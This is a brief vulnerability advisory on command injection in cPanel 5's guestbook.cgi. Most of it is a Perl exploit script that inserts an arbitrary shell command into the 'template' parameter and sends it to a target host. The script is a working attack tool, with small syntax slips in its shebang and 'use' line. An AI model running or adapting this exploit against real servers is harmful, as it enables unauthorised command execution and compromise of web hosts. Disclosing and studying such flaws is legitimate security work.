source: http://www.securityfocus.com/bid/6882/info
 
A remote command execution vulnerability has been discovered in the cPanel CGI Application. This issue occurs due to insufficient sanitization of externally supplied data to the 'guestbook.cgi' script.
 
An attacker may exploit this vulnerability to execute commands in the security context of the web server hosting the affected script.
 
This vulnerability has been reported to affect cPanel version 5, previous versions may also be affected.

#!usr/bin/perl
use LWP::UserAgent
print "##########################################\n";
print "#                                        #\n";
print "#      Remote Exploit for Cpanel 5       #\n";
print "#                                        #\n";
print "##########################################\n";
print "                           C0d3r: CaMaLeoN\n";
die "Use: $0 <host> <command>\n" unless ($ARGV[1]);
$web=$ARGV[0];
$comando=$ARGV[1];
$fallos="cgi-sys/guestbook.cgi?user=cpanel&template=$comando";
$url="http://$web/$fallos";
$ua = LWP::UserAgent->new();
$request = HTTP::Request->new('HEAD', $url);
$response = $ua->request($request);
if ($response->code == 200){
                            print "Command sent.\n";
                           }
                           else
                           {
                            print "The command could not be sent.\n";
                           } 